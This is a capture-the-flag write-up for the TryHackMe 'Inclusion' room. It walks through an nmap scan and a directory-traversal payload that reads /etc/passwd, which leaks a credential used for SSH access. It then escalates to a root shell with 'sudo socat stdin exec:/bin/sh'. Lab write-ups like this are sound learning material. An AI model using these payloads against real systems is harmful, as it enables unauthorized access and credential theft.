# TryHackMe | [Inclusion](https://tryhackme.com/room/inclusion)

## What is the user flag?

First, we will enumerate our target.

```bash
❯ nmap -sV 10.10.85.254
Nmap scan report for 10.10.85.254
Host is up (0.14s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.98 seconds
```

As we can see, two ports are open on our target machine, port 22 for ssh and port 80 with http. Let's see what we have on port 80.

![Blog](/images/blog.png)

That's a pretty cute blog right there. As we are interested in LFI, let's view its details.

![LFI](/images/lfi.png)

Um...We have this very well presented blog about LFI attacks. It seems to include details about Directory Traversal along with its example. Lets give it a try, shall we?

```
http://10.10.85.254/article?name=../../../../etc/passwd
```

![passwd](/images/passwd.png)

Well well well, what do we have here ;)

A commented out user:passwd pair is present. I wonder where it could be used. SSH maybe?

```bash
falconfeast@inclusion:~$ ls
articles user.txt
falconfeast@inclusion:~$ cat user.txt
[REDACTED]
```

## What is the root flag?

Now its time to escalate priviledges. Lets see what we can run as root.

```bash
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
(root) NOPASSWD: /usr/bin/socat
```

I think [GTFOBins](https://gtfobins.github.io/gtfobins/socat/) may have something that can help us.

```bash
sudo socat stdin exec:/bin/sh
```

Lets plug that into the terminal.

```bash
falconfeast@inclusion:~$ sudo socat stdin exec:/bin/sh
whoami
root
cd /root
ls
root.txt
cat root.txt
[REDACTED]
```
